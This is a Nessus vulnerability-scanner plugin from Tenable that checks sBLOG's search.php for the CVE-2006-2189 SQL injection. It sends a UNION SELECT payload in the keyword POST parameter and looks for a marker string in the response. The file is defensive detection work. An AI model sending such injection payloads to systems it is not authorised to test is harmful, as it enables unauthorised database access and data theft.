#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21313);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2006-2189");
  script_bugtraq_id(17782);
  script_xref(name:"OSVDB", value:"25612");

  script_name(english:"sBLOG search.php keyword Parameter SQL Injection");
  script_summary(english:"Checks for keyword parameter SQL injection in sBLOG");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running sBLOG, a PHP-based blog application. 

The installed version of sBLOG fails to validate user input to the
'keyword' parameter of the 'search.php' script before using it to
generate database queries.  Regardless of PHP's 'magic_quotes_gpc'
setting, an unauthenticated attacker can leverage this issue to
manipulate database queries to, for instance, bypass authentication,
disclose sensitive information, modify data, or launch attacks against
the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/432724/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/sblog", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Check whether the affected script exists.
  url = string(dir, "/search.php");

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # If it does...
  if ("sBLOG" >< res && '<input type="text" name="keyword"' >< res)
  {
    magic = string("nessus-", unixtime());

    postdata = string(
      "keyword=", urlencode(str:string(SCRIPT_NAME, "%' UNION SELECT '", magic, "',1,2--"))
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (isnull(res)) exit(0);

    # There's a problem if we see our magic string as the post topic.
    if (egrep(pattern:string('class="sblog_post_topic"><a href="[^"]+/blog\\.php\\?id=', magic, '"'), string:res))
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
